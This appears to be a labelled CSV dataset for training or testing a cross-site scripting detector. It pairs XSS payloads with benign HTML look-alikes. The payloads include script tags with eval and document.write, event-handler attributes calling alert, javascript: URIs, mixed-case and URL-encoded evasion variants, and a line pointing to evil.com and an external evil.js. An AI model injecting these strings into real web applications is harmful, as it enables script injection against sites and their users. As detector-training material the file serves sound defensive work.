payload,label
<scrIpt>DocuMeNT.wRItE('<ImG SRC=X ONERrOr=ALerT(1)>')</ScrIPT>,1
javasCript:voId(0),0
<DiV OncLiCK=inIt()>,0
<SPaN onmoUSEover=init()>,0
<ImG ONMoUSeOVer=alErT(1)>,1
<DiV ONfocUs=CoNfIrm(1)>,1
<Svg oNLoaD=showMEnU()>,0
<scRIpt>evAl('aLErt(1)')</ScRipT>,1
<SVG OnfOCus=iNIt()>,0
<img OnLoAd=ConfIRM(1)>,1
IDKzuC<img onfocus=prompt(1)>KSSCRK,1
<sVG ONCLicK=INit()>,0
<svG oNFOcuS=coNfirM(1)>,1
i5<script>window</script>S8rAg,1
JavAScRipT:vOiD(0),0
qo5Ft<svg onload=noop()>Kx,0
<SVG oNLOAd=INIT()>,0
<div ONmoUseOver=PromPt(1)>,1
XMAjavascript:alert(1)kTu5g,1
javAsCRIPT:Void(0),0
<a OnmOUSeovEr=aLERT(1)>,1
jaVAscrIPt:voiD(0),0
75jjavascript:void(0)yO,0
<DIv oNCLIck=HIGHlIGHT()>,0
<a oNMoUSEover=VALIdAte()>,0
OmS<svg onmouseover=noop()>Z9XL,0
<A onfocUs=COnFiRM(1)>,1
9w<div onfocus=prompt(1)>1k,1
<img ONfocus=alerT(1)>,1
javascript%3Avoid%280%29,0
FotQ<svg onmouseover=prompt(1)>HW67m,1
"<ScRIpT>SETtimeOUt('aLert(1)',1000)</scripT>",1
<div onfocus=prom,1
<dIV oNcliCk=iNiT()>,0
jug5javascript:void(0)wj,0
WztSel<script>window</script>ZVtcrt,1
JAVaScRIpt:VoiD(0),0
<Svg OnCLicK=INIT()>,0
<a onclick=valid,0
ye<svg onfocus=showMenu()>uo2a,0
<div onload=sho,0
<Div onFoCUs=cOnFiRm(1)>,1
apMUJjavascript:confirm(1)p8LsN,1
<sPAN onCliCk=PrOMpT(1)>,1
jaVASCriPt:aLERt(1),1
<img OncliCK=VALIDatE()>,0
hg<span onload=showMenu()>EVscN3,0
qzi6<a onfocus=confirm(1)>t1M,1
<a ONlOAd=SHOwmeNU()>,0
<sVG onFoCUs=alErt(1)>,1
RLdzjavascript:void(0)yJW,0
2ISPjavascript:alert(1)T4,1
tx<a onmouseover=confirm(1)>QkxJc,1
<SCRIPt>DoCuMENT.WRITe('<IMg sRc=X OneRror=Alert(1)>')</scripT>,1
"<ScRiPt>SEttImeOut('alerT(1)',1000)</SCrIPt>",1
<svg OncliCK=NooP()>,0
5R<img onclick=alert(1)>vDJ6b0,1
<a onCLIcK=HIghlighT()>,0
<diV onCLICK=INIT()>,0
"zi0<script>setTimeout('alert(1)',1000)</script>4mgb4",1
tqI<div onload=prompt(1)>vAmfTJ,1
<diV onlOaD=iNIt()>,0
XyqEZ<a onmouseover=noop()>Qmy,0
JavaScRIpt:VOId(0),0
<SVg onmOUSeovEr=nOop()>,0
2R<span onclick=highlight()>8dxuxR,0
%253Cspan%2520onload%253Dinit%2528%2529%253E,0
JaVascrIPt:coNFIRM(1),1
Rqjavascript:alert(1)ba0,1
JavAsCRIpT:cOnFiRm(1),1
Nw<svg onmouseover=highlight()>04702,0
<A ONfoCUs=COnfIRM(1)>,1
%253C/table%253E,0
hq<script>window</script>uek,1
<a onlOad=aLeRt(1)>,1
lby<div onclick=alert(1)>p3,1
us<span onmouseover=init()>LaUAJ2,0
<ImG ONmOuSeOVEr=COnFiRM(1)>,1
VqYcjavascript:void(0)bz6rmC,0
EWzcrl<a onfocus=confirm(1)>GyLib,1
KGyIjavascript:void(0)bZYZ,0
YVzGN<svg onmouseover=alert(1)>XzB,1
qwR<div onload=init()>Fx427,0
JavAScriPT:ALErt(1),1
<a OnmoUSEoVEr=CONfIrm(1)>,1
dKCM<a onclick=showMenu()>Hg,0
<img onfocus=n,0
gt2<a onload=confirm(1)>8Ca,1
xmeSjavascript:prompt(1)hOIrC,1
%3Cspan%20onfocus%3Dhighlight%28%29%3E,0
<IMg OnMOuSeovER=iNIT()>,0
<sCriPt>EvaL('Alert(1)')</SCRIpT>,1
<script>DocuMENt.WRITe('<imG Src=X ONERRoR=AlErt(1)>')</SCrIPt>,1
<div onCLick=CoNfiRM(1)>,1
8F0<script>window</script>RH,1
<div onload=confirm(1,1
wQf44I<div onclick=showMenu()>pCE,0
rVw<span onmouseover=highlight()>mH0,0
N2<svg onload=alert(1)>Z93,1
<a Onload=PROMPt(1)>,1
<sVG OnMOuseOVer=nOop()>,0
"pMsC<script>setTimeout('alert(1)',1000)</script>483",1
Du<svg onload=confirm(1)>6Gd,1
<SCriPt>eVAl('alerT(1)')</ScRIPT>,1
<svg OnfoCus=alerT(1)>,1
javASCript:voId(0),0
<sVg OnMoUSEOVEr=Alert(1)>,1
jAvaScRiPT:prOmpt(1),1
<spaN oncLIcK=inIt()>,0
<iMg onMOuseovEr=NOop()>,0
<SpAN onloaD=ProMpT(1)>,1
<A oNMouSEoveR=CONFIRM(1)>,1
<div oNMOUseOVer=ProMpT(1)>,1
<iMG onCLicK=aLert(1)>,1
<sCrIPT>DocuMEnT.wRItE('<IMg src=X onerROR=aLErT(1)>')</sCriPt>,1
<SvG oncLicK=hIgHlIghT()>,0
"<scRipT>seTTimeOuT('alert(1)',1000)</SCrIPt>",1
<SPaN oNmouseOVer=PROMPT(1)>,1
<DIv oNClICK=VaLidate()>,0
&lt;img onload=init()&gt;,0
BBrONm<a onmouseover=highlight()>zHpnqG,0
<sPAn ONclICK=INIT()>,0
iGfPokjavascript:void(0)Ed,0
<a onclick=alert(1,1
JaVascRiPT:voID(0),0
<scRIpT>Eval('aleRt(1)')</SCRIPt>,1
<A onfOcUS=ValIdaTE()>,0
<a oNFOCus=prompt(1)>,1
<span onmouseover=confirm(1),1
jAvasCriPt:VOiD(0),0
<div onmouseover=validate,0
<a ONMoUSEOveR=NoOP()>,0
<SVg ONLoad=aLeRT(1)>,1
<SVG oNfocuS=sHOwmenU()>,0
</Tr>,0
JaVaSCript:Void(0),0
<ImG ONcLicK=proMPT(1)>,1
qNji0G<a onload=validate()>YPFGGE,0
<sVg OnFOcUS=NOoP()>,0
UMS<img onload=alert(1)>25,1
&lt;a onclick=highlight()&gt;,0
JavasCript:CONfIRM(1),1
JAvAScRIpT:VOID(0),0
<iMG oncLIcK=conFIrm(1)>,1
jAvasCRIpt:AlERt(1),1
JavAscriPt:VoId(0),0
<ScRIPT>WiNdoW</SCRiPt>,1
jaVascRipt:Void(0),0
<SCRIPT>Eval('ALErt(1)')</ScriPt>,1
er74o<a onclick=confirm(1)>Owkq,1
PqmOYl<a onclick=init()>tG0,0
<sPaN oNMOUSeoveR=ALERT(1)>,1
<A onClICK=HigHLigHT()>,0
<a onLOad=NOoP()>,0
dn1Uhttp://evil.com%00google.comIh,1
<svg oNMoUseOVER=INIT()>,0
jAVascrIpt:vOID(0),0
<sVg onfOcUs=PromPt(1)>,1
<SvG oNLoAd=higHLIGHt()>,0
<sCRIpT>wINDow</sCripT>,1
<SPAN ONmOuSeovER=iNit()>,0
M1TyFZ<script>window</script>NW,1
HtJ<span onclick=highlight()>ewQ1z,0
THNY<script>document.write('<img src=x onerror=alert(1)>')</script>SAC0,1
u2guVj<svg onclick=validate()>6Pf,0
JAVASCRIpT:pRomPT(1),1
LV<div onmouseover=alert(1)>BejE,1
<SCRIPt>EVal('AlErT(1)')</ScRIPT>,1
<a onfocus=val,0
<diV onfOcUs=iNIt()>,0
<img ONLoAD=hIGhliGHt()>,0
<SPaN ONfOCUs=CoNFiRm(1)>,1
M2<img onclick=noop()>MVd,0
<ImG ONLOAD=iNIt()>,0
"<ScrIpT>SEttIMEoUt('ALerT(1)',1000)</sCRiPT>",1
<sPAn ONmOUSeOVER=vAliDATE()>,0
<scRIpt>evAL('AleRT(1)')</scRiPT>,1
JavaSCRIPT:VoiD(0),0
Jj<svg onload=noop()>TzoYd,0
ECw<span onload=prompt(1)>VU,1
cwGY<div onclick=init()>gLUr2,0
FAjavascript:confirm(1)d5J,1
<SPAN OnfOCUs=PROmPt(1)>,1
vqRCAZ<span onclick=validate()>QFbf,0
<SpAn ONmouseoVER=HigHlIghT()>,0
&lt;img onfocus=showMenu()&gt;,0
<a OnMOuSEoVeR=nOop()>,0
<A oNFoCUs=ShowmeNu()>,0
%3Ca%20onfocus%3Dhighlight%28%29%3E,0
"Qqf<script>setTimeout('alert(1)',1000)</script>zA6",1
<img onmouseover=alert(1),1
jAvaScRipt:VoID(0),0
2O<span onclick=highlight()>zmeK7N,0
<SPaN oNcLIck=SHowMEnu()>,0
JAvAScRipt:vOid(0),0
jaVasCRIpT:proMPT(1),1
<DIv ONMOUsEoVer=PrompT(1)>,1
jAvaScRipT:COnfIrm(1),1
"4IFY30<script>setTimeout('alert(1)',1000)</script>qtH",1
JAVAsCRIpT:VOId(0),0
<sCRIpT>wiNdoW</ScrIPt>,1
VU<img onfocus=prompt(1)>4w9L7,1
JAVaScRIPt:Prompt(1),1
JaVasCripT:VOid(0),0
621<div onclick=prompt(1)>j8wtHz,1
<a oNlOAd=alErt(1)>,1
<SCRiPt>EVAL('ALeRt(1)')</ScrIpt>,1
Tt<script>window</script>n2t,1
<Div ONMOUSEOveR=ValIdaTe()>,0
<ImG OnFoCuS=nOoP()>,0
RI9s<script>eval('alert(1)')</script>YkNUo,1
jAvaScrIpT:alErt(1),1
%253Cdiv%253EHello%253C/div%253E,0
MaMgmq<div onclick=highlight()>mZsJu4,0
x9<img onload=noop()>0En,0
<span onmouseover=validate,0
"<scRipT>SetTiMEoUt('alerT(1)',1000)</sCRIPT>",1
JAVAsCrIPt:vOId(0),0
<svG oNclICK=COnfIRm(1)>,1
<SVg ONclick=cOnfIrm(1)>,1
<ScRipt>WiNDOw</ScRiPT>,1
<sPaN ONCLIck=PROMpt(1)>,1
tY6gQ<svg onload=alert(1)>Jf,1
<ScRipt>docuMent.WriTE('<ImG sRc=X OnErrOr=alERT(1)>')</SCrIPt>,1
<a onfocus=init,0
<ScRiPT>dOcumENT.WRite('<iMg src=X OnERRor=AlERT(1)>')</SCriPT>,1
<sCRiPt>eVAl('AlERt(1)')</scRIPt>,1
jAVAscRIpT:alert(1),1
<sPAN oNfocUS=VALIDaTE()>,0
MIr<span onfocus=alert(1)>ennU,1
JAvAscrIPT:AlerT(1),1
%253Cscript%253EsetTimeout%2528%2527alert%25281%2529%2527%252C1000%2529%253C/script%253E,1
javascRIpt:VoiD(0),0
<ScriPt>WINdow</scripT>,1
"<SCRipt>SeTtImEOUt('Alert(1)',1000)</sCrIPT>",1
<sPAN OnmOUSEoVEr=prOmPT(1)>,1
"MDzq7B<script>setTimeout('alert(1)',1000)</script>CsnB",1
KTUDqjavascript:void(0)tsG,0
pTva<svg onfocus=confirm(1)>2rHW8p,1
<A oNFOcUS=CoNFIrM(1)>,1
<spaN onmOuSeOVeR=inIT()>,0
<SPAn OnMOuSeOVEr=vALiDatE()>,0
nf<svg onfocus=noop()>GT,0
jAVascRipT:Alert(1),1
"<SCRiPT>sEtTImeOuT('aleRT(1)',1000)</SCriPt>",1
JAVascrIPt:cONFIrM(1),1
JaVaScrIPT:VOId(0),0
<DIv oncLICk=HiGhLIgHt()>,0
bAjavascript:void(0)ZVbYu,0
<svG ONMOUsEovER=ValiDAte()>,0
<IMG ONCLicK=NOop()>,0
<A onFOCUS=NOOP()>,0
<Div ONcLick=prompT(1)>,1
<SCRIpT>eVAl('ALERT(1)')</sCriPt>,1
zuHjavascript:prompt(1)nt,1
arP9ijavascript:void(0)oU,0
<SPan OnCLICk=aLeRT(1)>,1
<A ONmOUSeOveR=noOP()>,0
<DiV oNlOAD=ShoWmENu()>,0
<scrIpt>DoCUmEnt.WrITe('<Img SrC=x ONeRrOR=ALerT(1)>')</ScripT>,1
PIxSPx<div onmouseover=validate()>Fc,0
Nje3<script>window</script>pFi1mi,1
jAvASCrIpt:CONFIrm(1),1
4qOJ<div onmouseover=prompt(1)>E0,1
&lt;svg onmouseover=highlight()&gt;,0
JavAsCrIPt:VOid(0),0
"<sCrIpt>sETTimEoUt('aLeRT(1)',1000)</SCrIpT>",1
Czya<a onfocus=init()>9usdy,0
yIDxjavascript:void(0)LqQ,0
llUF<div onmouseover=alert(1)>EluL,1
WTUyDC<div onfocus=confirm(1)>My,1
<div ONMOUSEoVER=cONFIRm(1)>,1
<scRIpT>eVal('alerT(1)')</sCrIpt>,1
<sPaN OnmOuSeOVEr=iniT()>,0
eIqC<div onload=highlight()>Kq,0
4MGGjavascript:prompt(1)UJ,1
jaVASCrIPT:CONFiRm(1),1
<DiV OnClIck=nooP()>,0
jAvASCRipt:voID(0),0
javascRiPt:VOID(0),0
<sVg ONLOaD=ValIdATe()>,0
Qj5<a onfocus=noop()>Hm,0
<DIV ONmOUseoVER=AleRT(1)>,1
JAvaScripT:Void(0),0
<imG OnCLIcK=proMpt(1)>,1
vRH3javascript:prompt(1)GE2V1,1
<SPan ONloAD=init()>,0
<svG onloaD=vALIDate()>,0
<sCriPt>eVaL('aLert(1)')</script>,1
<A oNmoUSEoveR=InIT()>,0
<scrIpT>dOCumeNT.WrItE('<imG SRC=X OnError=AlerT(1)>')</SCRIpt>,1
jaVasCRiPT:VoId(0),0
jAvAscRipt:alerT(1),1
<scRiPT>evAl('alErt(1)')</ScrIpT>,1
<iMG onlOAD=HIGhligHT()>,0
JaVAscRiPT:ALeRT(1),1
gogBuv<svg onmouseover=init()>Yq,0
<DiV oNMousEover=ALert(1)>,1
4Esjavascript:void(0)WoJEV0,0
<Svg onMOuSEoVER=cONfIrM(1)>,1
&lt;script a='&gt;' src='//evil.js'&gt;&lt;/script&gt;,1
Q1NJ<span onload=noop()>KkX62,0
<SVg oNFoCuS=nOOP()>,0
JAVASCRiPt:voID(0),0
<A oNcLiCK=ValIdATE()>,0
<sPaN ONmousEOVer=PrOMpT(1)>,1
<Div ONfoCUS=iniT()>,0
<svg onclick=init()>,0
<a onmouseover=confirm(1,1
<IMG OnCliCK=pRoMpT(1)>,1
IJ<img onclick=prompt(1)>OYE7V,1
<Svg Onload=Init()>,0
<dIV onlOAd=AlerT(1)>,1
<SCrIpt>wiNDoW</scRIpT>,1
<SCriPT>WindoW</sCRIpt>,1
AdzBfjavascript:confirm(1)xngCjf,1
<a ONMOUSeovER=alErT(1)>,1
TWHSd5<div onmouseover=alert(1)>Dwmje,1
jAvAScRIpt:cOnFirM(1),1
ViqUdI<svg onmouseover=init()>7Hk,0
<sVg oNClICK=HigHlIgHt()>,0
naS<img onfocus=confirm(1)>QCcZcl,1
<span onfocus=validate(),0
<SCripT>winDow</sCriPt>,1
<ScriPT>DoCumeNT.wrITE('<iMG sRc=x ONErRor=alErT(1)>')</sCRIPT>,1
qsM78<a onclick=confirm(1)>Cz,1
<iMG OnCLIcK=vAlIDaTE()>,0
<svG oncLiCk=aLert(1)>,1
JaVAsCrIpT:cONfIRm(1),1
<ImG ONfOcuS=sHOWmenu()>,0
"<SCRIpT>sEttiMEout('AlErt(1)',1000)</SCripT>",1
<scRIpT>EVal('ALerT(1)')</sCripT>,1
<sVg ONmoUSEovER=PROmPT(1)>,1
JAVaSCRIPt:promPT(1),1
jAVAsCRiPt:alErt(1),1
D3sbE<div onfocus=prompt(1)>GcF,1
67w9<script>document.write('<img src=x onerror=alert(1)>')</script>zTC,1
<div oNLoaD=AlERt(1)>,1
<scRipt>eVaL('ALErt(1)')</SCripT>,1
<SVG ONMousEOVEr=Init()>,0
7hMct<script>document.write('<img src=x onerror=alert(1)>')</script>aETu2,1
<svg onmouseover=pr,1
<SVG onfOcUs=prOmPt(1)>,1
<a OnFOcus=HIGhlight()>,0
<Div ONFOcus=ALErt(1)>,1
<A ONLOaD=ValidatE()>,0
me37javascript:prompt(1)dc1,1
JAVAsCripT:VOiD(0),0
<div oNFoCus=hIGhlIgHt()>,0
<SvG onMOusEoveR=hIghligHt()>,0
tE0javascript:confirm(1)KtlA,1
KtH<a onmouseover=confirm(1)>Nx,1
<DIV ONfOcus=COnfIrm(1)>,1
TnINm<div onload=alert(1)>ynIZuY,1
<SCriPt>documEnt.wrIte('<img sRc=x oneRROr=alERt(1)>')</scRIpT>,1
Uii2javascript:void(0)wcz,0
<a onclick=alert(1),1
jaVaScrIPt:pRoMPt(1),1
"jCPND<script>setTimeout('alert(1)',1000)</script>k9t",1
<a OnLOAd=vaLidAtE()>,0
<IMg ONcLick=vALIDaTe()>,0
<imG oNmOusEover=ALeRt(1)>,1
zkQe2<span onfocus=prompt(1)>Rkt1,1
<SpaN ONMOUseoVeR=pROmpt(1)>,1
Yo2Hbsjavascript:prompt(1)6tR,1
<sCrIpT>WInDow</SCRiPT>,1
<dIv ONMoUSeover=ValiDAtE()>,0
<svg onfocUS=iniT()>,0
<SCript>DOcUMENt.WrITE('<iMG sRC=X oNerrOR=ALERT(1)>')</SCrIPT>,1
<A OnFoCuS=CoNFirm(1)>,1
%253Csvg%2520onload%253Dprompt%25281%2529%253E,1
Fo<script>document.write('<img src=x onerror=alert(1)>')</script>O6F,1
<iMG oNfoCus=VAlIdATE()>,0
&lt;/table&gt;,0
<dIV oNClICk=HIGHlIgHt()>,0
<scRIPT>eVal('alERt(1)')</scripT>,1
R0njavascript:prompt(1)zzfH3X,1
<scripT>docUMENt.wRiTE('<iMG sRC=X oNErRoR=aLeRt(1)>')</SCrIpt>,1
CmvGr<img onmouseover=showMenu()>0qj,0
<sVg onMOUseOver=CoNFIRm(1)>,1
<A ONclick=PromPt(1)>,1
<ImG onfOCus=ValIDAte()>,0
JAvAScRIpT:voiD(0),0
<sCRipT>DoCuMenT.wrIte('<IMg srC=X OnERroR=aLErt(1)>')</ScRIpt>,1
<spaN onmouSeOVer=INit()>,0
zCEN<img onclick=confirm(1)>RM,1
<a onfOCuS=prOMpT(1)>,1
BaHVE<a onmouseover=init()>iPeQ,0
<Span ONLOad=sHowmENu()>,0
zx9ozI<span onload=showMenu()>q98V4Z,0
"<ScripT>sEttIMEouT('ALeRT(1)',1000)</sCRiPt>",1
<SPan oNCLiCK=ShOWMenu()>,0
<IMg ONmoUSEOvER=SHoWmENu()>,0
"<sCriPt>SeTTimeOuT('aLeRt(1)',1000)</sCripT>",1
PrUNl<span onclick=alert(1)>vX9,1
CVujavascript:confirm(1)xbv,1
<a onFOcus=nOop()>,0
JAVasCRIpt:Alert(1),1
JavaSCrIPT:ALeRT(1),1
<sVg oNLoaD=pRompt(1)>,1
%3Cspan%20onload%3Dconfirm%281%29%3E,1
otSrk<img onmouseover=showMenu()>Ib,0
<a ONCliCK=conFIRm(1)>,1
<SVg ONlOaD=INit()>,0
5AlN<svg onfocus=alert(1)>GJuzR,1
<svg onmouseover=confir,1
<imG onloaD=alert(1)>,1
<scRIpt>dOcuMeNT.WrItE('<IMg SRc=X oneRroR=ALErT(1)>')</SCripT>,1
<scrIPt>dOCUment.wRite('<iMG Src=x oNErRoR=AlErT(1)>')</sCriPt>,1
CLLel<script>document.write('<img src=x onerror=alert(1)>')</script>n8sc,1
<spaN oncLICk=HIgHLIGHt()>,0
JAVaSCriPT:PRomPT(1),1
<Div oNFOcuS=HiGHLIGht()>,0
<Img ONMouseoVer=AlErT(1)>,1
uECvQV<span onfocus=validate()>wYu8,0
<div onload=no,0
<A oNLOAD=InIT()>,0
javAscRIPt:pROMpt(1),1
Ia<a onfocus=highlight()>Kp,0
<dIv ONfOcuS=iniT()>,0
<ScRIpt>WiNDow</ScRiPT>,1
zdOvM<script>window</script>CrqSZB,1
RrD2Av<a onfocus=confirm(1)>BvIeK,1
ot<script>eval('alert(1)')</script>f8,1
jAVasCripT:void(0),0
<scrIpt>DoCUMEnT.wriTE('<Img src=X onErrOr=AlErT(1)>')</Script>,1
<sPan oNFOcus=hiGHLight()>,0
<a onmouseover=va,0
<DIV onloAd=NoOp()>,0
"AU9V8Y<script>setTimeout('alert(1)',1000)</script>PoC8",1
<dIV OnCLIcK=vaLIDAtE()>,0
JavascrIpt:VoID(0),0
<a onload=alert,1
<iMg oNmoUsEoVeR=ShOWMEnU()>,0
<spaN onlOAd=PRompT(1)>,1
<SCrIpT>DocumEnt.WrItE('<img SrC=X oNerrOr=aLeRt(1)>')</sCrIpt>,1
<Img onload=aleRt(1)>,1
<span onmouseover=ale,1
jAvasCripT:Void(0),0
p89Zjavascript:prompt(1)vdHcx,1
<ImG OnCLIcK=ShowmeNU()>,0
<scRIPt>DoCUmeNt.WrIte('<img src=X onErRor=AlERT(1)>')</SCrIPT>,1
<iMg ONFOCUS=hIGhlight()>,0
<scrIpT>DocumEnt.WrITE('<imG sRC=X onerROr=alERt(1)>')</scRiPT>,1
<A OnfOCuS=Alert(1)>,1
"PYk8KZ<script>setTimeout('alert(1)',1000)</script>1I",1
L7lZ<span onclick=confirm(1)>7Q,1
<A onMOUsEOver=vaLiDate()>,0
5sw16I<a onfocus=validate()>cM41JM,0
<span onclicK=VALIdate()>,0
"<ScRiPT>SettiMEOUT('ALERt(1)',1000)</SCrIPt>",1
<sPAn ONClicK=INit()>,0
<spaN OnMOuseOver=AleRT(1)>,1
JavaScRiPT:VOid(0),0
<SVg onMOUsEoVer=ConFIRm(1)>,1
iqpQ<a onclick=confirm(1)>Hso3,1
javASCrIPT:pRoMpT(1),1
<Svg OnMoUSEoVEr=IniT()>,0
<sCRIpT>evAl('aLERt(1)')</ScrIPT>,1
<SPaN onfoCuS=NOOp()>,0
Kis<img onload=confirm(1)>SMRTj,1
DlN<a onmouseover=showMenu()>lSTLkF,0
<SPaN ONCliCk=COnFIRm(1)>,1
<SPAn onloaD=prOmpT(1)>,1
Qj<span onmouseover=showMenu()>at,0
<dIv OnmOuSEover=alERt(1)>,1
<spAn onmoUseOVER=Init()>,0
<dIv ONCLIcK=hIGHLIgHt()>,0
<sVG ONCliCK=ALErT(1)>,1
<SVg ONlOad=CoNfIrM(1)>,1
k0<div onfocus=init()>zI0w,0
JavASCrIpt:PROMPt(1),1
<img src=ca,0
DfKVb<script>document.write('<img src=x onerror=alert(1)>')</script>LI9Dd,1
zZ<svg onclick=prompt(1)>cb,1
<sPan onfOCuS=nooP()>,0
WXYjavascript:confirm(1)H6U,1
<div onmouseover=alert(,1
<sCRiPt>DoCUmeNT.wRItE('<iMg SRC=x ONERRor=ALErT(1)>')</ScRipT>,1
w4hy<div onmouseover=alert(1)>bUJqrE,1
<sCrIPt>EvAl('aLeRt(1)')</sCrIPt>,1
2iB<a onload=validate()>IWDdIy,0
<diV onFoCus=sHOWMENu()>,0
JAvASCrIpT:pROMPt(1),1
<IMg onfoCUS=Noop()>,0
JAVAsCrIPT:pRomPt(1),1
E46<span onmouseover=alert(1)>exVscL,1
<diV ONloaD=vALidatE()>,0
ZT<svg onclick=init()>UHX,0
<sVg OnmoUSeOvER=HiGHlIght()>,0
<SvG ONmouSEOVER=hiGHLIGHt()>,0
JAVAsCripT:voID(0),0
<span OncLiCk=CoNfIrM(1)>,1
<DIV ONfoCUs=AlErt(1)>,1
<Span ONFOcUS=vaLIDATE()>,0
<div ONfoCUs=prOmpt(1)>,1
JAvaScrIPT:VoiD(0),0
<scRipT>EvAl('alerT(1)')</sCRIpT>,1
"<sCrIPt>SettimEOuT('alERt(1)',1000)</ScrIpT>",1
"FStP<script>setTimeout('alert(1)',1000)</script>hUzZy",1
ZQf1javascript:void(0)TBiB,0
JavAScRipt:ALERt(1),1
JoUbj<svg onclick=alert(1)>bCN,1
jAvaSCrIPt:VOid(0),0
<SPan oNlOAd=aLErT(1)>,1
"<scrIpt>seTtimEOUt('ALERT(1)',1000)</scriPT>",1
<div onclick=hi,0
JaVAsCrIPT:VoID(0),0
<DiV onmOuSeoveR=hIGHLIghT()>,0
VDBX<span onmouseover=init()>Yiy,0
<a onclick=confirm(1,1
<sVg oNLOAd=HIghLight()>,0
<A OnClicK=ALerT(1)>,1
lRXT<svg onmouseover=init()>9T,0
%253Cspan%2520onfocus%253Dvalidate%2528%2529%253E,0
qN5<span onmouseover=highlight()>9b,0
<IMg oNclIck=valIdATE()>,0
<svg onmouseove,1
"<SCripT>SettiMEouT('ALERt(1)',1000)</ScrIPT>",1
tYxu<svg onfocus=prompt(1)>Tqaz,1
<scripT>eVaL('aLeRT(1)')</sCRiPt>,1
<DIv onfocUS=COnfIRm(1)>,1
<sPAn oNFOcuS=sHOwmEnU()>,0
<ImG oNfocUS=ALErT(1)>,1
<A oNfOcUs=ValIdaTE()>,0
<sCRiPT>docUmEnT.WriTe('<IMG sRC=x oNeRROr=AleRt(1)>')</ScRipT>,1
<IMG ONFOCUs=promPt(1)>,1
YZjavascript:void(0)5998,0
<Span oNMOuSEOVer=PROmpt(1)>,1
<a oncliCK=vALiDATE()>,0
<svg onmouseover=showMenu(,0
<A onFOCus=NooP()>,0
a52C<div onload=noop()>KmGU,0
qxjavascript:alert(1)ZLJ,1
fMLF<script>document.write('<img src=x onerror=alert(1)>')</script>ZlL4,1
<SPAN onLOaD=sHOwmeNu()>,0
wvjavascript:alert(1)NO1fAA,1
jaVASCRIPt:AlErt(1),1
<a oNload=Alert(1)>,1
"Ru<script>setTimeout('alert(1)',1000)</script>VyLLf",1
<Svg OnClick=PrOMpT(1)>,1
2GNosOjavascript:void(0)TmVsrC,0
<span onload=noop()>,0
kKRrd<span onmouseover=noop()>DMrGil,0
<spAn ONmousEovEr=proMpT(1)>,1
0w5APD<a onfocus=alert(1)>92f,1
<a onfocus=highlight()>,0
8kqANK<div onclick=init()>if,0
hUEn<svg onfocus=prompt(1)>xt,1
<sPan OnmOUseOVER=HighLiGhT()>,0
wc<script>window</script>qTLu,1
<svG onFoCus=NooP()>,0
UNcsjavascript:alert(1)C1hGzp,1
vc<span onmouseover=noop()>p0DWY,0
<IMg ONClICK=AleRT(1)>,1
k5qJj<svg onmouseover=prompt(1)>wmxsCt,1
<ScRiPt>wIndOW</SCripT>,1
<a onmouseover=p,1
zZ<script>document.write('<img src=x onerror=alert(1)>')</script>t77,1
<img onclick=prom,1
"<scriPt>seTTImEOuT('AlErT(1)',1000)</sCRIPT>",1
<sVg ONmOusEoVeR=InIT()>,0
JAVasCRipt:void(0),0
kNkZBW<span onmouseover=init()>va8S,0
<sVG onmoUsEOVeR=VAlIdAte()>,0
lWxx0<div onmouseover=alert(1)>WBN,1
<Div OnMOUSEOvER=ALErt(1)>,1
"<ScrIpt>SetTimeout('aLeRt(1)',1000)</ScrIPT>",1
NwmSn<a onload=highlight()>3j5Fh,0
<DIv oNcLICk=aLErT(1)>,1
ZObY<img onmouseover=alert(1)>iF,1
<IMG oNloaD=VaLiDate()>,0
<iMg OnLOaD=conFIrM(1)>,1
<a OnFOCUs=InIt()>,0
rQ<div onload=alert(1)>RO,1
<scriPt>evAL('ALERT(1)')</sCRipt>,1
yqjavascript:void(0)ON3yi,0
<A oncLICK=cONFIrm(1)>,1
JavaScrIPt:cOnfIrM(1),1
<div OnmoUSEOVer=PrOmPt(1)>,1
<SPaN ONfocUS=iNIT()>,0
<imG OnmoUsEOvEr=PROmpt(1)>,1
<Div onmOusEOvER=shoWmeNu()>,0
JAVaSCrIpt:proMPt(1),1
in6q<svg onclick=confirm(1)>72ecP,1
cdGh<span onmouseover=alert(1)>bx3,1
<dIv oNfOCUS=iNiT()>,0
<DIv OnMoUSeover=NOoP()>,0
<sVg ONloAd=COnFIrM(1)>,1
<SVG onMOuSeOVEr=ValIDatE()>,0
aiHr<svg onfocus=noop()>bd,0
zr<span onmouseover=highlight()>TS,0
<sPan ONmouSeoVER=IniT()>,0
"<ScRIPt>sETTiMEOUt('AlErt(1)',1000)</SCrIPT>",1
<a oNlOAD=CoNFIRM(1)>,1
7MSbk<img onclick=confirm(1)>Rt,1
dC8Gjavascript:confirm(1)kil,1
qu4<img onfocus=confirm(1)>Pl,1
<span onload,0
0dr<span onclick=prompt(1)>im,1
